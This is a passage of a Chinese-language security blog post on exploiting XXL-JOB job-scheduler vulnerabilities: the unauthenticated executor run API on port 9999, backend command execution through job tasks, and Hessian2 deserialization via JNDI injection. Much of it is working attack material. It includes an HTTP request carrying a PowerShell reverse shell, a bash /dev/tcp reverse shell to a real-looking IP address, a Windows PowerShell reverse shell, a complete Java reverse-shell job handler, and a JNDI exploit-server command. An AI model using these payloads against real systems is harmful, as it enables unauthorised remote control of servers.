+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span><span class="p">,</span> <span class="n">br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec</span><span class="o">-</span><span class="n">GPC</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">XXL</span><span class="o">-</span><span class="n">JOB</span><span class="o">-</span><span class="n">ACCESS</span><span class="o">-</span><span class="n">TOKEN</span><span class="p">:</span> <span class="n">default_token</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="p">:</span> <span class="n">u</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">856</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;jobId&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;executorHandler&#34;</span><span class="p">:</span> <span class="s2">&#34;demoJobHandler&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;executorParams&#34;</span><span class="p">:</span> <span class="s2">&#34;demoJobHandler&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;executorBlockStrategy&#34;</span><span class="p">:</span> <span class="s2">&#34;COVER_EARLY&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;executorTimeout&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;logId&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;logDateTime&#34;</span><span class="p">:</span> <span class="mi">1586629003729</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;glueType&#34;</span><span class="p">:</span> <span class="s2">&#34;GLUE_POWERSHELL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;glueSource&#34;</span><span class="p">:</span> <span class="s2">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;1.1.1.1&#39;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%</span><span class="si">{0}</span><span class="s2">;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;glueUpdatetime&#34;</span><span class="p">:</span> <span class="mi">1586699003758</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;broadcastIndex&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;broadcastTotal&#34;</span><span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">Linux</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;glueType&#34;</span><span class="p">:</span> <span class="s2">&#34;GLUE_SHELL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;glueSource&#34;</span><span class="p">:</span> <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/115.190.248.147/6666 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意：这个是9999端口的run接口存在未授权才可能执行成功，为什么是9999端口，8080端口默认只是管理员管理界面，不执行任务，实际执行命令默认都是通过9999端口进行执行</p>
+<p>高版本执行器应用指纹</p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/3.png"
+	width="1105"
+	height="182"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/3_hu0ce40813398c73c09352243601cd5a84_19060_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/3_hu0ce40813398c73c09352243601cd5a84_19060_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="607"
+		data-flex-basis="1457px"
+	
+></p>
+<h2 id="3xxl-job-任务调度中心-后台任意命令执行漏洞">3.XXL-JOB 任务调度中心 后台任意命令执行漏洞
+</h2><p><strong>功能点：任务管理</strong></p>
+<p>**tips：**记得确定目标操作系统是Windows还是Linux，Linux用Shell模式，Windows用powershell模式。</p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/4.png"
+	width="2141"
+	height="1289"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/4_huc080f1a88a73b409ab5310a82b75a504_230963_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/4_huc080f1a88a73b409ab5310a82b75a504_230963_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="398px"
+	
+></p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/5.png"
+	width="2264"
+	height="848"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/5_hu23bb59e5c63debeb594a275acf84b011_180291_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/5_hu23bb59e5c63debeb594a275acf84b011_180291_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="266"
+		data-flex-basis="640px"
+	
+></p>
+<p>编辑要执行的命令</p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/6.png"
+	width="1623"
+	height="301"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/6_hua56a92e0db680d2abf408d32a7d640c7_40412_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/6_hua56a92e0db680d2abf408d32a7d640c7_40412_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="539"
+		data-flex-basis="1294px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">WIndows下反弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">client</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">Net</span><span class="o">.</span><span class="n">Sockets</span><span class="o">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;115.190.248.147&#39;</span><span class="p">,</span><span class="mi">6666</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">stream</span> <span class="o">=</span> <span class="err">$</span><span class="n">client</span><span class="o">.</span><span class="n">GetStream</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="err">$</span><span class="nb">bytes</span> <span class="o">=</span> <span class="mf">0..65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">((</span><span class="err">$</span><span class="n">i</span> <span class="o">=</span> <span class="err">$</span><span class="n">stream</span><span class="o">.</span><span class="n">Read</span><span class="p">(</span><span class="err">$</span><span class="nb">bytes</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="err">$</span><span class="nb">bytes</span><span class="o">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-</span><span class="n">ne</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="o">-</span><span class="n">TypeName</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="err">$</span><span class="nb">bytes</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="err">$</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">sendback</span> <span class="o">=</span> <span class="p">(</span><span class="n">iex</span> <span class="err">$</span><span class="n">data</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">Out</span><span class="o">-</span><span class="n">String</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">sendback2</span> <span class="o">=</span> <span class="err">$</span><span class="n">sendback</span> <span class="o">+</span> <span class="s1">&#39;PS &#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="n">Path</span> <span class="o">+</span> <span class="s1">&#39;&gt; &#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">sendbyte</span> <span class="o">=</span> <span class="p">([</span><span class="n">text</span><span class="o">.</span><span class="n">encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="err">$</span><span class="n">sendback2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">stream</span><span class="o">.</span><span class="n">Write</span><span class="p">(</span><span class="err">$</span><span class="n">sendbyte</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="err">$</span><span class="n">sendbyte</span><span class="o">.</span><span class="n">Length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">stream</span><span class="o">.</span><span class="n">Flush</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">client</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/7.png"
+	width="763"
+	height="217"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/7_hua4c58860e379790e8c13ba68e4c9d847_227700_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/7_hua4c58860e379790e8c13ba68e4c9d847_227700_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="351"
+		data-flex-basis="843px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">Java环境反弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">package</span> <span class="n">com</span><span class="o">.</span><span class="n">xxl</span><span class="o">.</span><span class="n">job</span><span class="o">.</span><span class="n">service</span><span class="o">.</span><span class="n">handler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.BufferedWriter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.OutputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.OutputStreamWriter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.Socket</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="nc">reverse</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">StreamConnector</span>
+</span></span><span class="line"><span class="cl">    <span class="n">extends</span> <span class="n">Thread</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">InputStream</span> <span class="n">hx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">OutputStream</span> <span class="n">il</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">StreamConnector</span><span class="p">(</span><span class="n">InputStream</span> <span class="n">hx</span><span class="p">,</span> <span class="n">OutputStream</span> <span class="n">il</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">this</span><span class="o">.</span><span class="n">hx</span> <span class="o">=</span> <span class="n">hx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">this</span><span class="o">.</span><span class="n">il</span> <span class="o">=</span> <span class="n">il</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">void</span> <span class="n">run</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">BufferedReader</span> <span class="n">ar</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">BufferedWriter</span> <span class="n">slm</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">ar</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span> <span class="n">InputStreamReader</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">hx</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">slm</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BufferedWriter</span><span class="p">(</span><span class="n">new</span> <span class="n">OutputStreamWriter</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">il</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">char</span><span class="p">[]</span> <span class="n">buffer</span> <span class="o">=</span> <span class="n">new</span> <span class="n">char</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">int</span> <span class="n">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">while</span> <span class="p">((</span><span class="n">length</span> <span class="o">=</span> <span class="n">ar</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="o">.</span><span class="n">length</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">slm</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">slm</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">catch</span> <span class="p">(</span><span class="ne">Exception</span> <span class="n">localException</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="n">ar</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">ar</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="n">slm</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">slm</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">catch</span> <span class="p">(</span><span class="ne">Exception</span> <span class="n">localException1</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">reverse</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">reverseConn</span><span class="p">(</span><span class="s2">&#34;1.1.1.1:6666&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">void</span> <span class="n">reverseConn</span><span class="p">(</span><span class="n">String</span> <span class="n">ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">ipport</span> <span class="o">=</span> <span class="n">ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">ShellPath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">getProperty</span><span class="p">(</span><span class="s2">&#34;os.name&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">toLowerCase</span><span class="p">()</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="s2">&#34;windows&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">ShellPath</span> <span class="o">=</span> <span class="n">new</span> <span class="n">String</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">ShellPath</span> <span class="o">=</span> <span class="n">new</span> <span class="n">String</span><span class="p">(</span><span class="s2">&#34;cmd.exe&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Socket</span> <span class="n">socket</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Socket</span><span class="p">(</span><span class="n">ipport</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> 
+</span></span><span class="line"><span class="cl">                                           <span class="n">Integer</span><span class="o">.</span><span class="n">parseInt</span><span class="p">(</span><span class="n">ipport</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">ShellPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new</span> <span class="n">StreamConnector</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">(),</span> 
+</span></span><span class="line"><span class="cl">                                    <span class="n">socket</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new</span> <span class="n">StreamConnector</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">getErrorStream</span><span class="p">(),</span> 
+</span></span><span class="line"><span class="cl">                                    <span class="n">socket</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new</span> <span class="n">StreamConnector</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">(),</span> 
+</span></span><span class="line"><span class="cl">                                    <span class="n">process</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">())</span><span class="o">.</span><span class="n">start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">catch</span> <span class="p">(</span><span class="ne">Exception</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/8.png"
+	width="745"
+	height="181"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/8_hu31e424ede919f3ad84b0ef0d593090ac_190271_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/8_hu31e424ede919f3ad84b0ef0d593090ac_190271_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="411"
+		data-flex-basis="987px"
+	
+></p>
+<h2 id="4xxl-job-api未授权hessian2反序列化复现">4.XXL-JOB api未授权hessian2反序列化复现
+</h2><p><strong>影响版本：XXL-JOB&lt;=2.0.2</strong></p>
+<h3 id="41利用jndi注入打内存马"><strong>4.1.利用JNDI注入打内存马</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">VPS开启监听</span>
+</span></span><span class="line"><span class="cl"><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">JNDI</span><span class="o">-</span><span class="n">Injection</span><span class="o">-</span><span class="n">Exploit</span><span class="o">-</span><span class="mf">1.0</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="nb">all</span><span class="o">.</span><span class="n">jar</span> <span class="o">-</span><span class="n">C</span> <span class="s2">&#34;calc&#34;</span> <span class="o">-</span><span class="n">A</span> <span class="s2">&#34;x.x.x.x&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rmi</span><span class="p">:</span><span class="o">//</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="p">:</span><span class="mi">1099</span><span class="o">/</span><span class="n">mv3dcp</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/9.png"
+	width="2060"
+	height="646"
